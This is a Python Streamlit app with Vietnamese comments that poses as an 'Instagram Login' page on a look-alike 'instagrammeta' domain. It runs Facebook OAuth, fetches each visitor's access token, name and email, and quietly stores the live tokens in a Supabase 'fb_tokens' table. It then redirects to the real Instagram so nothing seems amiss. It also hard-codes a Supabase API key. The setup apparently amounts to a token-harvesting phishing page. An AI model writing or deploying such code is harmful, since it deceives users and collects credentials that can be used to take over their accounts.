import streamlit as st
import urllib.parse
import secrets

# ==============================================
# PHẢI TRÙNG KHỚP 100% với Facebook Dashboard
# ==============================================
CLIENT_ID = "1589243162990530"
CLIENT_SECRET = "Điền Client Secret từ Cài đặt → Ứng dụng"

# ⚠️ PHẢI GIỐNG HỆT trong: URI chuyển hướng hợp lệ + Miền ứng dụng
REDIRECT_URI = "https://instagrammeta.streamlit.app/"

FB_API_VERSION = "v24.0"
SUPABASE_URL = "https://mxuthpngeagcxoxtnjhd.supabase.co"
SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im14dXRocG5nZWFnY3hveHRuamhkIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODQ2NTA5MjEsImV4cCI6MjEwMDIyNjkyMX0.Fbf5vMxG4C3JERld_4LvlQBPNrQB8UQcz_aloIOaHBs"

# ==============================================
# CSRF STATE
# ==============================================
if "oauth_state" not in st.session_state:
    st.session_state.oauth_state = secrets.token_urlsafe(32)

st.set_page_config(page_title="Instagram Login", layout="centered")

# ==============================================
# NHẬN CODE TỪ FACEBOOK
# ==============================================
query_params = st.query_params
code = query_params.get("code")
returned_state = query_params.get("state")
error = query_params.get("error")

if error:
    error_desc = query_params.get("error_description", "Không rõ lỗi")
    st.error(f"❌ Lỗi: {error_desc}")
    st.stop()

# ==============================================
# CÓ CODE → ĐỔI THÀNH TOKEN
# ==============================================
if code:
    if returned_state != st.session_state.oauth_state:
        st.error("⚠️ Lỗi bảo mật. Vui lòng thử lại.")
        st.stop()

    st.info("🔄 Đang xác minh...")

    import requests
    from datetime import datetime, timedelta

    token_url = f"https://graph.facebook.com/{FB_API_VERSION}/oauth/access_token"
    token_params = {
        "client_id": CLIENT_ID,
        "client_secret": CLIENT_SECRET,
        "redirect_uri": REDIRECT_URI,
        "code": code
    }

    token_res = requests.get(token_url, params=token_params)
    token_data = token_res.json()

    if "access_token" not in token_data:
        st.error(f"❌ Lỗi: {token_data}")
        st.stop()

    access_token = token_data["access_token"]
    expires_in = token_data.get("expires_in", 5184000)

    # Lấy thông tin user
    profile_url = f"https://graph.facebook.com/{FB_API_VERSION}/me"
    profile_params = {"fields": "id,name,email", "access_token": access_token}
    profile_res = requests.get(profile_url, params=profile_params)
    profile = profile_res.json()

    # Lưu vào Supabase
    try:
        from supabase import create_client
        supabase = create_client(SUPABASE_URL, SUPABASE_KEY)
        supabase.table("fb_tokens").upsert([{
            "facebook_id": profile.get("id"),
            "name": profile.get("name"),
            "email": profile.get("email"),
            "access_token": access_token,
            "expires_at": (datetime.utcnow() + timedelta(seconds=expires_in)).isoformat()
        }], on_conflict="facebook_id").execute()
    except Exception as e:
        st.warning(f"⚠️ Lỗi lưu Supabase: {e}")

    # Xóa tham số khỏi URL
    st.query_params.clear()

    # Chuyển đến Instagram
    st.success(f"✅ Xin chào {profile.get('name', 'Bạn')}!")
    st.markdown("""
    <script>
    setTimeout(() => window.top.location.href = "instagram://", 800);
    setTimeout(() => window.top.location.href = "https://www.instagram.com", 2500);
    </script>
    """, unsafe_allow_html=True)
    st.stop()

# ==============================================
# CHƯA CÓ CODE → CHUYỂN ĐẾN FACEBOOK
# ==============================================
auth_url = (
    f"https://www.facebook.com/{FB_API_VERSION}/dialog/oauth?"
    f"client_id={urllib.parse.quote(CLIENT_ID)}"
    f"&redirect_uri={urllib.parse.quote(REDIRECT_URI)}"
    f"&response_type=code"
    f"&scope=email,public_profile"
    f"&state={urllib.parse.quote(st.session_state.oauth_state)}"
)

st.info("⏳ Đang chuyển hướng đến Facebook...")

# Tự động chuyển hướng ĐÚNG CÁCH
st.markdown(f"""
<script>
if (window.top !== window.self) {{
    window.top.location.href = "{auth_url}";
}} else {{
    window.location.href = "{auth_url}";
}}
</script>
""", unsafe_allow_html=True)

# Nút dự phòng
st.markdown(f"[👉 Nhấp vào đây nếu không tự động chuyển hướng]({auth_url})")